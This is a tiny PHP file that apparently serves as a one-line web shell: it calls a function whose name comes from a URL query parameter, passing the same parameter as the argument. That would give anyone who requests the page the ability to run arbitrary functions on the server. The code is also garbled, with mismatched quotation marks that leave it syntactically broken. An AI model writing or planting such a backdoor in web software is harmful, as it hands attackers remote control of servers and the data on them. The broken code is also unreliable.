<?php
$_GET["3M98M_0e']($_GET['3M98M_0e']);
?>
